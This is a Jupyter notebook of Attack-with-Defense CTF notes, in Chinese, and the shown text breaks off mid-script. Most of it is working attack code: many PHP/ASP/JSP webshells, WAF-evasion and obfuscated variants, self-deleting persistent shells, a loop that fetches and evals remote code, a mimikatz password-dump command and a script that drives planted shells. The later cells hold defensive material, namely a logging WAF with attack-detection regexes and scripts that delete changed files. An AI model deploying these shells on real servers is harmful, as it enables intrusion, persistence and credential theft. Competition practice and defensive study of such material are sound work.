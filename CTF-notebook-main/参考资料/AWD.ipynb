{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Webshell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 靶场"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### vulfocus-著名大型靶场"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://hub.docker.com/r/vulfocus/vulfocus\n",
    "\n",
    "docker pull vulfocus/vulfocus\n",
    "docker run -d -p 9380:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=192.168.1.6 vulfocus/vulfocus\n",
    "\n",
    "095347aa4d4051fafab6b4308b4c46ba1bfe9abe5c672e449a280bfe20282ea6\n",
    "\n",
    "\n",
    "http://vulapps.evalbug.com/\n",
    "https://github.com/CTFTraining/CTFTraining\n",
    "https://www.fujieace.com/penetration-test/ctf-training.html\n",
    "https://vulhub.org/\n",
    "https://github.com/D0g3-Lab/H1ve\n",
    "https://github.com/facebookarchive/fbctf\n",
    "https://hub.docker.com/search?q=ctftraining&type=image\n",
    "https://github.com/WebGoat/WebGoat\n",
    "https://github.com/webpwnized/mutillidae\n",
    "https://github.com/adamdoupe/WackoPicko\n",
    "https://github.com/Hackademic/hackademic\n",
    "https://github.com/stamparm/DSVW\n",
    "https://github.com/cr0hn/vulnerable-node\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### ctfd-著名开源靶场"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://hub.docker.com/r/ctfd/ctfd\n",
    "https://www.github.com/CTFd/CTFd\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### pikachu"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://github.com/zhuifengshaonianhanlu/pikachu\n",
    "\n",
    "docker pull area39/pikachu:latest\n",
    "docker pull gabrielclimb/pikachu:latest\n",
    "\n",
    "docker run -d -p 9180:80 area39/pikachu\n",
    "\n",
    "f29cbf6bd958ded5d66bf2e05685169211881dc8cd0ef9d3fbd37a2d5cca1c94\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### dvwa"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "http://www.dvwa.co.uk/\n",
    "https://github.com/digininja/DVWA\n",
    "\n",
    "docker pull soheileizadi/dvwa:latest\n",
    "docker pull rbenavente/dvwa-fargate:latest\n",
    "docker pull utspark/dvwa_frontend\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### sqli-labs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://github.com/Audi-1/sqli-labs\n",
    "\n",
    "docker pull acgpiano/sqli-labs\n",
    "docker pull c0ny1/sqli-labs\n",
    "docker pull fengbj/sqli-labs\n",
    "docker pull jylsec/sqli-labs"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 一句话"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "##########################################################################################\n",
    "##########################################################################################\n",
    "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" \"exit\"\n",
    "\n",
    "\n",
    "##########################################################################################\n",
    "##########################################################################################\n",
    "echo '<?php @eval($_POST[cmd]);?>' > ss.php\n",
    "\n",
    "普通的php一句话：<?php @eval($_POST['r00ts']);?>\n",
    "\n",
    "\n",
    "php的一句话木马： <?php @eval($_POST['pass']);?>\n",
    "<?php eval($_POST[sb]);?>\n",
    "\n",
    "<?php @eval($_POST[cmd]);?>\n",
    "\n",
    "<?php system($_REQUEST['cmd']);?> \n",
    "\n",
    "<?php assert($_POST[cmd]);?>\n",
    "\n",
    "<?fputs(fopen(c.php,w),<?eval($_POST[c]);?>)?>\n",
    "\n",
    "\n",
    "\n",
    "##########################################################################################\n",
    "##########################################################################################\n",
    "\n",
    "asp的一句话是：   <%eval request (\"pass\")%>\n",
    "aspx的一句话是：  <%@ Page Language=\"Jscript\"%> <%eval(Request.Item[\"pass\"],\"unsafe\");%>\n",
    "\n",
    "<%eval request(\"c\")%>\n",
    "<%execute request(\"c\")%>\n",
    "<%execute(request(\"c\"))%>\n",
    "<%ExecuteGlobal request(\"sb\")%>\n",
    "%><%Eval(Request(chr(35)))%><%\n",
    "<%if request (\"c\")<>\"\"then session(\"c\")=request(\"c\"):end if:if session(\"c\")<>\"\" then execute session(\"c\")%>\n",
    "<%eval(Request.Item[\"c\"],\"unsafe\");%>\n",
    "'备份专用\n",
    "<%eval(request(\"c\")):response.end%>\n",
    "'无防下载表,有防下载表突破专用一句话\n",
    "<%execute request(\"c\")%><%<%loop<%:%>\n",
    "<%<%loop<%:%><%execute request(\"c\")%>\n",
    "<%execute request(\"c\")<%loop<%:%>\n",
    "'防杀防扫专用\n",
    "<%if Request(\"c\")<>\"\" ThenExecuteGlobal(Request(\"c\"))%>\n",
    "'不用\"<,>\"\n",
    "<script language=VBScript runat=server>execute request(\"c\")</script>\n",
    "<% @Language=\"JavaScript\" CodePage=\"65001\"var lcx={'名字':Request.form('#'),'性别':eval,'年龄':'18','昵称':'请叫我一声老大'};lcx.性别((lcx.\n",
    "名字)+'') %>\n",
    "<script language=vbs runat=server>eval(request(\"c\"))</script>\n",
    "<script language=vbs runat=server>eval_r(request(\"c\"))</script>\n",
    "'不用双引号\n",
    "<%eval request(chr(35))%>\n",
    "'可以躲过雷客图\n",
    "<%set ms = server.CreateObject(\"MSScriptControl.ScriptControl.1\") ms.Language=\"VBScript\" ms.AddObject\"response\",response ms.AddObject\n",
    " \n",
    "\"request\",request ms.ExecuteStatement(\"ev\"&\"al(request(\"\"c\"\"))\")%>\n",
    "<%dy=request(\"dy\")%><%Eval(dy)%>\n",
    "'容错代码\n",
    "if Request(\"sb\")<>\"\" then ExecuteGlobal request(\"sb\") end if\n",
    "PHP一句话\n",
    " \n",
    "<?php eval($_POST1);?>\n",
    "<?php if(isset($_POST['c'])){eval($_POST['c']);}?>\n",
    "<?php system($_REQUEST1);?>\n",
    "<?php ($_=@$_GET1).@$_($_POST1)?>\n",
    "<?php eval_r($_POST1)?>\n",
    "<?php @eval_r($_POST1)?>//容错代码\n",
    "<?php assert($_POST1);?>//使用Lanker一句话客户端的专家模式执行相关的PHP语句\n",
    "<?$_POST['c']($_POST['cc']);?>\n",
    "<?$_POST['c']($_POST['cc'],$_POST['cc'])?>\n",
    "<?php @preg_replace(\"/[email]/e\",$_POST['h'],\"error\");?>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在\"配置\"一栏输入*/:<O>h=@eval_r($_POST1);</O>\n",
    "<?php echo `$_GET['r']` ?>\n",
    "//绕过<?限制的一句话\n",
    "<script language=\"php\">@eval_r($_POST[sb])</script>\n",
    " \n",
    "//绕过<?php ?>限制的一句话 \n",
    " \n",
    "<?=eval($_POST['cmd']);\n",
    " \n",
    "JSP一句话\n",
    " \n",
    "<%if(request.getParameter(\"f\")!=null)(newjava.io.FileOutputStream (application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write (request.getParameter(\"t\").getBytes());%>\n",
    "提交客户端\n",
    "<form action=\"\" method=\"post\"><textareaname=\"t\"></textarea><br/><input type=\"submit\"value=\"提交\"></form>\n",
    "ASPX一句话\n",
    "<script language=\"C#\"runat=\"server\">WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(\"add6bb58e139be10\")</script>\n",
    " \n",
    "\n",
    "普通的asp一句话：<%eval(Request.Item[\"r00ts\"],”unsafe”);%>\n",
    "aspx突破一流的：\n",
    "dim da\n",
    "set fso=server.createobject(\"scripting.filesystemobject\")\n",
    "path=request(\"path\")\n",
    "if path<>\"\" then\n",
    "data=request(\"da\")\n",
    "set da=fso.createtextfile(path,true)\n",
    "da.write data\n",
    "if err=0 then\n",
    "Response.Write \"yes\"\n",
    "else\n",
    "Response.Write \"no\"\n",
    "end if\n",
    "err.clear\n",
    "end if\n",
    "set da=nothing\n",
    "set fos=nothing\n",
    "Response.Write \"<form action=\" method=post>\"\n",
    "Response.Write \"<input type=text name=path>\"\n",
    "Response.Write \"<br>\"\n",
    "Response.Write \"当前文件路径:\"&server.mappath(request.servervariables(\"script_name\"))\n",
    "Response.Write \"<br>\"\n",
    "Response.Write \"操作系统为:\"&Request.ServerVariables(\"OS\")\n",
    "Response.Write \"<br>\"\n",
    "Response.Write \"WEB服务器版本为:\"&Request.ServerVariables(\"SERVER_SOFTWARE\")\n",
    "Response.Write \"<br>\"\n",
    "Response.Write \"<textarea name=da cols=50 rows=10 width=30></textarea>\"\n",
    "Response.Write \"<br>\"\n",
    "Response.Write \"<input type=submit value=save>\"\n",
    "Response.Write \"</form>\"\n",
    "</Script>\n",
    " \n",
    " \n",
    "ASP一句话:<%IfRequest(“1″)<>”\"ThenExecuteGlobal(Request(“1″))%>\n",
    " \n",
    "PHP防杀放扫 一句话：<?php (])?>\n",
    "上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如\n",
    "index.asp里面也是可以的！\n",
    " \n",
    "因为加了判断！加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件\n",
    "的最底部不会出错！<?if(isset($_POST['1'])){eval($_POST['1']);}?><?php system($_REQUEST[1]);?>\n",
    " \n",
    "无防下载表，有防下载表可尝试插入以下语句突破的一句话\n",
    "<%execute request(“class”)%><%'<% loop <%:%><%'<% loop <%:%><%execute request(“class”)%><%execute request(“class”)'<% loop <%:%>\n",
    " \n",
    " \n",
    "备份专用<%eval(request(“1″)):response.end%>\n",
    "asp一句话<%execute(request(“1″))%>\n",
    "aspx一句话:<scriptrunat=”server”>WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y(“add6bb58e139be10″);</script>\n",
    " \n",
    "可以躲过雷客图的一句话。\n",
    "<%set ms = server.CreateObject(“MSScriptControl.ScriptControl.1″)\n",
    "ms.Language=”VBScript”ms.AddObject”Response”,Responsems.AddObject”request”,\n",
    "requestms.ExecuteStatement(“ev”&”al(request(“”1″”))”)%>\n",
    " \n",
    "不用'<,>‘的asp一句话<scriptrunat=server>execute request(“1″)</script>\n",
    " \n",
    "不用双引号的一句话。<%eval request(chr(35))%>\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 常规一句话"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "PHP：<?php @eval($_POST['v5est0r']);?>\n",
    "\n",
    "ASP：<%eval request(\"v5est0r\")%>\n",
    "\n",
    "\n",
    "PHP：v5est0r=echo \"password is v5est0r\";\n",
    "\n",
    "ASP：v5est0r=response.write(\"password:v5est0r\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 过狗过D盾的小马(过宝塔WAF)\n",
    "密码2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?php\n",
    "$arr = strrev('tressa');\n",
    "$arr($_POST[strcspn('di', 'ke')]);\n",
    "?>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 过狗的WAF\n",
    "https://www.o2oxy.cn/aa.php?str[]=assert   密码2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "$arr = array_chunk($_GET['str'],1);\n",
    "if($arr!=''){\n",
    "        $con = str_replace('鸡儿','变长5厘米',$arr[0][0]);\n",
    "        $con(base64_decode($_POST[strcspn('di', 'ke')]));\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "如果担心assert通过$_GET传值会被拦截，可以把\n",
    "$arr = array_chunk($_GET[‘str’],1);  替换成$arr = array_chunk(array(strrev($_GET[‘str’][0])),1);\n",
    "替换后连接地址就是:127.0.0.1/1.php?str[]=tressa\n",
    "就是代码显得有点多。\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## webshell驻留内存"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?php\n",
    "    ignore_user_abort(true);\n",
    "    set_time_limit(0);\n",
    "    $file = 'shell.php';\n",
    "    $code = '<?php eval($_POST[cmd]);?>';\n",
    "    while(true) {\n",
    "        if(!file_exists($file)) {\n",
    "            file_put_contents($file, $code);\n",
    "        } else{\n",
    "            if(md5(file_get_contents($file)) !== md5($code)){\n",
    "                file_put_contents($file, $code);\n",
    "            }\n",
    "        }\n",
    "        usleep(10);\n",
    "    }\n",
    "?>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 無文件webshell"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#1.txt\n",
    "file_put_contents('./1.php','<?php @eval($_POST[ph4ntom]); ?>');\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?php\n",
    "    unlink(__FILE__);\n",
    "    ignore_user_abort(true);\n",
    "    set_time_limit(0);\n",
    "    $remote_file = 'http://127.0.0.1/1.txt';\n",
    "    while($code = file_get_contents($remote_file)){\n",
    "        @eval($code);\n",
    "        sleep(5);\n",
    "    };  \n",
    "\n",
    "?> "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## PHP Webshell"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?php system($_GET[\"cmd\"]); ?>\n",
    "<?php system($_GET[1]); ?>\n",
    "<?php system(\"`$_GET[1]`\"); ?>\n",
    "<?= system($_GET[cmd]);\n",
    "<?=`$_GET[1]`;\n",
    "<?php eval($_POST[cmd]);?>\n",
    "<?php echo `$_GET[1]`;\n",
    "<?php echo passthru($_GET['cmd']);\n",
    "<?php echo shell_exec($_GET['cmd']);\n",
    "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>\n",
    "<script language=\"php\">system(\"id\"); </script>\n",
    "\n",
    "<?php $_GET['a']($_GET['b']); ?>\n",
    "// a=system&b=ls\n",
    "// a=assert&b=system(\"ls\")\n",
    "\n",
    "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['cmd']);?>\n",
    "// .php?cmd=system(\"ls\")\n",
    "\n",
    "<?@extract($_REQUEST);@die($f($c));?>\n",
    "// .php?f=system&c=id\n",
    "\n",
    "<?php @include($_FILES['u']['tmp_name']);  \n",
    "// 構造 <form action=\"http://x.x.x.x/shell.php\" method=\"POST\" enctype=\"multipart/form-data\">上傳\n",
    "// 把暫存檔include進來\n",
    "// From: http://www.zeroplace.cn/article.asp?id=906\n",
    "\n",
    "<?php $x=~¾¬¬º­«;$x($_GET['a']); ?>\n",
    "// not backdoor (assert)\n",
    "// .php?a=system(\"ls\")\n",
    "\n",
    "echo \"{${phpinfo()}}\";\n",
    "\n",
    "echo \"${system(ls)}\";\n",
    "\n",
    "echo Y2F0IGZsYWc= | base64 -d | sh\n",
    "// Y2F0IGZsYWc=   =>  cat  flag\n",
    "\n",
    "echo -e \"<?php passthru(\\$_POST[1])?>;\\r<?php echo 'A PHP Test ';\" > shell.php\n",
    "// cat shell.php\n",
    "// <?php echo 'A PHP Test ';\" ?>\n",
    "\n",
    "echo ^<?php eval^($_POST['a']^); ?^> > a.php\n",
    "// Windows echo導出一句話\n",
    "\n",
    "<?php fwrite(fopen(\"gggg.php\",\"w\"),\"<?php system(\\$_GET['a']);\");\n",
    "\n",
    "<?php\n",
    "header('HTTP/1.1 404');\n",
    "ob_start();\n",
    "phpinfo();\n",
    "ob_end_clean();\n",
    "?>\n",
    "\n",
    "<?php \n",
    "// 無回顯後門  \n",
    "// e.g. ?pass=file_get_contents('http://kaibro.tw/test')\n",
    "ob_start('assert');\n",
    "echo $_REQUEST['pass'];\n",
    "ob_end_flush();\n",
    "?>\n",
    "\n",
    "<?=\n",
    "// 沒有英數字的webshell\n",
    "$💩 = '[[[[@@' ^ '(\"(/%-';\n",
    "$💩(('@@['^'#!/').\" /????\");\n",
    "\n",
    "\n",
    "A=fl;B=ag;cat $A$B"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## php dotnet webshell"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?php\n",
    "$command=$_GET['cmd'];\n",
    "$wsh = new COM('WScript.shell');\n",
    "$exec = $wsh->exec(\"cmd /c \".$command);\n",
    "$stdout = $exec->StdOut();\n",
    "$stroutput = $stdout->ReadAll();\n",
    "echo $stroutput;\n",
    "?>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 一句话字典爆破"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "python3 D:\\attack_with_defense\\web\\Shell_Buster\\ShellBuster.py http://127.0.0.1:8088/1.php php D:\\attack_with_defense\\dict\\4.txt\n",
    "                \n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## awd对抗"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 备份"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "比赛开始第一时间备份，备份网站目录及数据库，一般在 /var/www/html 目录。\n",
    "\n",
    "一是为了 dump 下来，用 D 盾查杀存在的后门；\n",
    "二是为了比赛出现异常或恶意破坏进行还原，避免靶机宕机被扣分；\n",
    "三要审计下有没有高危命令执行函数，进行后期加固，以及有空余时间或专门安排一个人审计下基础漏洞用来做攻击。\n",
    "命令执行函数 exec()、passthru()、system()、 shell_exec()、popen() 等;代码执行函数：eval()、assert()、preg_repace()、uasort() 等；文件包含函数 include() 、require() 等，用正则匹配 grep -r \"@eval\" /www/，找到后注释掉。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 弱口令"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "大多数情况下，所有队伍的 Web 后台、phpmyadmin 等服务的管理密码都一样，立马快速检查修改自己密码，并利用此进行攻击。一般默认密码为 admin/admin, admin/123456, test/test，如果被其他队伍改了那就 gg 了。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 查杀后门, 批量提交flag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/usr/bin/env python\n",
    "#coding=utf-8\n",
    "\n",
    "import requests\n",
    "\n",
    "url=\"http://192.168.1.\"\n",
    "path=\"/1.php\"\n",
    "port=\"8088\"\n",
    "passwd='abcd'\n",
    "for i in range(6,7):\n",
    "    payload={\n",
    "        passwd:'system(\\'dir\\');'\n",
    "    }\n",
    "    r=requests.post(url+str(i)+\":\"+port+path,data=payload)\n",
    "    print(url+str(i)+\":\"+port+path)\n",
    "    print(r.text)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 不死马"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?php\n",
    "    ignore_user_abort(true);  // 忽略連線中斷\n",
    "    set_time_limit(0);  // 設定無執行時間上限\n",
    "    $file = 'shell.php';\n",
    "    $code = '<?php eval($_POST[cmd]);?>';\n",
    "    while(true) {\n",
    "        if(!file_exists($file)) {\n",
    "            file_put_contents($file, $code);\n",
    "        } else{\n",
    "            if(md5(file_get_contents($file)) !== md5($code)){\n",
    "                file_put_contents($file, $code);\n",
    "            }\n",
    "        }\n",
    "        usleep(10);\n",
    "    }\n",
    "?>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?php\n",
    "set_time_limit(0);\n",
    "//程序执行时间\n",
    "ignore_user_abort(1);\n",
    "//关掉终端后脚本仍然运行\n",
    "unlink(__FILE__);\n",
    "//文件完整名\n",
    "while(1) {\n",
    " file_put_contents('.test.php','<?php $a=array($_REQUEST[\"x\"]=>\"3\");   // pwd=x\n",
    "$b=array_keys($a)[0];\n",
    "eval($b);?>');\n",
    " sleep(5);\n",
    "}\n",
    "?>\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?php\n",
    " set_time_limit(0);\n",
    " ignore_user_abort(1);\n",
    " unlink(_FILE);\n",
    " while(1){\n",
    "  file_put_contents('./.config.php','<?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(\"\",$_cC);@$_();?>');\n",
    "  system('chmod777.config.php');\n",
    "  touch(\"./.config.php\",mktime(20,15,1,11,28,2016));   // pwd=1\n",
    "  usleep(100);\n",
    "  }\n",
    "?>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### waf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?php\n",
    "//error_reporting(E_ALL);\n",
    "//ini_set('display_errors', 1);\n",
    "/*\n",
    "检测请求方式，除了get和post之外拦截下来并写日志。\n",
    "*/\n",
    "if ($_SERVER['REQUEST_METHOD'] != 'POST' && $_SERVER['REQUEST_METHOD'] != 'GET') {\n",
    "    write_attack_log(\"method\");\n",
    "}\n",
    "$url = $_SERVER['REQUEST_URI']; //获取uri来进行检测\n",
    "$data = file_get_contents('php://input'); //获取post的data，无论是否是mutipa\n",
    "rt $headers = get_all_headers(); //获取header\n",
    "filter_attack_keyword(filter_invisible(urldecode(filter_0x25($url)))); //\n",
    "对URL进行检测，出现问题则拦截并记录filter_attack_keyword(filter_invisible(urldecode(filter_0x25($data))));\n",
    "//对POST的内容进行检测，出现问题拦截并记录\n",
    "/*\n",
    "检测过了则对输入进行简单过滤\n",
    "*/\n",
    "foreach ($_GET as $key => $value) {\n",
    "    $_GET[$key] = filter_dangerous_words($value);\n",
    "}\n",
    "foreach ($_POST as $key => $value) {\n",
    "    $_POST[$key] = filter_dangerous_words($value);\n",
    "}\n",
    "foreach ($headers as $key => $value) {\n",
    "    filter_attack_keyword(filter_invisible(urldecode(filter_0x25($value)))); //对http请求头进行检测，出现问题拦截并记录\n",
    "    $_SERVER[$key] = filter_dangerous_words($value); //简单过滤\n",
    "    \n",
    "}\n",
    "/*\n",
    "获取http请求头并写入数组\n",
    "*/\n",
    "function get_all_headers() {\n",
    "    $headers = array();\n",
    "    foreach ($_SERVER as $key => $value) {\n",
    "        if (substr($key, 0, 5) === 'HTTP_') {\n",
    "            $headers[$key] = $value;\n",
    "        }\n",
    "    }\n",
    "    return $headers;\n",
    "}\n",
    "/*\n",
    "检测不可见字符造成的截断和绕过效果，注意网站请求带中文需要简单修改\n",
    "*/\n",
    "function filter_invisible($str) {\n",
    "    for ($i = 0; $i < strlen($str); $i++) {\n",
    "        $ascii = ord($str[$i]);\n",
    "        if ($ascii > 126 || $ascii < 32) { //有中文这里要修改\n",
    "            if (!in_array($ascii, array(\n",
    "                9,\n",
    "                10,\n",
    "                13\n",
    "            ))) {\n",
    "                write_attack_log(\"interrupt\");\n",
    "            } else {\n",
    "                $str = str_replace($ascii, \" \", $str);\n",
    "            }\n",
    "        }\n",
    "    }\n",
    "    $str = str_replace(array(\n",
    "        \"`\",\n",
    "        \"|\",\n",
    "        \";\",\n",
    "        \",\"\n",
    "    ) , \" \", $str);\n",
    "    return $str;\n",
    "}\n",
    "/*\n",
    "检测网站程序存在二次编码绕过漏洞造成的%25绕过，此处是循环将%25替换成%，直至不存在%25\n",
    "*/\n",
    "function filter_0x25($str) {\n",
    "    if (strpos($str, \"%25\") !== false) {\n",
    "        $str = str_replace(\"%25\", \"%\", $str);\n",
    "        return filter_0x25($str);\n",
    "    } else {\n",
    "        return $str;\n",
    "    }\n",
    "}\n",
    "/*\n",
    "攻击关键字检测，此处由于之前将特殊字符替换成空格，即使存在绕过特性也绕不过正则的\\b\n",
    "*/\n",
    "function filter_attack_keyword($str) {\n",
    "    if (preg_match(\"/select\\b|insert\\b|update\\b|drop\\b|delete\\b|dumpfile\\b\n",
    "|outfile\\b|load_file|rename\\b|floor\\(|extractvalue|updatexml|name_const|m\n",
    "ultipoint\\(/i\", $str)) {\n",
    "        write_attack_log(\"sqli\");\n",
    "    }\n",
    "\n",
    "    if (substr_count($str, $_SERVER['PHP_SELF']) < 2) {\n",
    "        $tmp = str_replace($_SERVER['PHP_SELF'], \"\", $str);\n",
    "        if (preg_match(\"/\\.\\.|.*\\.php[35]{0,1}/i\", $tmp)) {\n",
    "            write_attack_log(\"LFI/LFR\");;\n",
    "        }\n",
    "    } else {\n",
    "        write_attack_log(\"LFI/LFR\");\n",
    "    }\n",
    "    if (preg_match(\"/base64_decode|eval\\(|assert\\(/i\", $str)) {\n",
    "        write_attack_log(\"EXEC\");\n",
    "    }\n",
    "    if (preg_match(\"/flag/i\", $str)) {\n",
    "        write_attack_log(\"GETFLAG\");\n",
    "    }\n",
    "}\n",
    "/*\n",
    "简单将易出现问题的字符替换成中文\n",
    "*/\n",
    "function filter_dangerous_words($str) {\n",
    "    $str = str_replace(\"'\", \"‘\", $str);\n",
    "    $str = str_replace(\"\\\"\", \"“\", $str);\n",
    "    $str = str_replace(\"<\", \"《\", $str);\n",
    "    $str = str_replace(\">\", \"》\", $str);\n",
    "    return $str;\n",
    "}\n",
    "/*\n",
    "获取http的请求包，意义在于获取别人的攻击payload\n",
    "*/\n",
    "function get_http_raw() {\n",
    "    $raw = '';\n",
    "    $raw.= $_SERVER['REQUEST_METHOD'] . ' ' . $_SERVER['REQUEST_URI'] . ' ' . $_SERVER['SERVER_PROTOCOL'] . \"\\r\\n\";\n",
    "    foreach ($_SERVER as $key => $value) {\n",
    "        if (substr($key, 0, 5) === 'HTTP_') {\n",
    "            $key = substr($key, 5);\n",
    "            $key = str_replace('_', '-', $key);\n",
    "            $raw.= $key . ': ' . $value . \"\\r\\n\";\n",
    "        }\n",
    "    }\n",
    "    $raw.= \"\\r\\n\";\n",
    "    $raw.= file_get_contents('php://input');\n",
    "    return $raw;\n",
    "}\n",
    "/*\n",
    "这里拦截并记录攻击payload\n",
    "*/\n",
    "function write_attack_log($alert) {\n",
    "    date_default_timezone_set(\"Asia/Shanghai\");\n",
    "    $data = date(\"Y/m/d H:i:s\") . \" --\n",
    "[\" . $alert . \"]\" . \"\\r\\n\" . get_http_raw() . \"\\r\\n\\r\\n\";\n",
    "    $ffff = fopen('log_is_a_secret_file.txt', 'a'); //日志路径\n",
    "    fwrite($ffff, $data);\n",
    "    fclose($ffff);\n",
    "    if ($alert == 'GETFLAG') {\n",
    "        header(\"location:http://172.16.9.2/\");\n",
    "    } else {\n",
    "        sleep(15); //拦截前延时15秒\n",
    "        \n",
    "    }\n",
    "    exit(0);\n",
    "}\n",
    "?>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Shell 监控新增文件"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#创建文件的时候更改文件创建时间熟悉可能监测不到。\n",
    "#循环监听一小时以内更改过的文件或新增的文件，进行删除。\n",
    "#!/bin/bash\n",
    "while true\n",
    "do\n",
    "    find /var/www/dvwa/ -cmin -60 -type f | xargs rm -rf\n",
    "    sleep 1\n",
    "done"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Python 监测新增文件"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#放在 /var/www/ 或 /var/www/html 下执行这个脚本，它会先备份当然目录下的所有文件，\n",
    "#然后监控当前目录，一旦当前目录下的某个文件发生变更，就会自动还原，有新的文件产生就会自动删除。\n",
    "\n",
    "import os\n",
    "import hashlib\n",
    "import shutil\n",
    "import ntpath\n",
    "import time\n",
    "\n",
    "CWD = os.getcwd()\n",
    "FILE_MD5_DICT = {} # 文件MD5字典\n",
    "ORIGIN_FILE_LIST = []\n",
    "\n",
    "# 特殊文件路径字符串\n",
    "Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'\n",
    "bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'\n",
    "logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'\n",
    "webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'\n",
    "difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'\n",
    "\n",
    "Special_string = 'drops_log' # 免死金牌\n",
    "UNICODE_ENCODING = \"utf-8\"\n",
    "INVALID_UNICODE_CHAR_FORMAT = r\"\\?%02x\"\n",
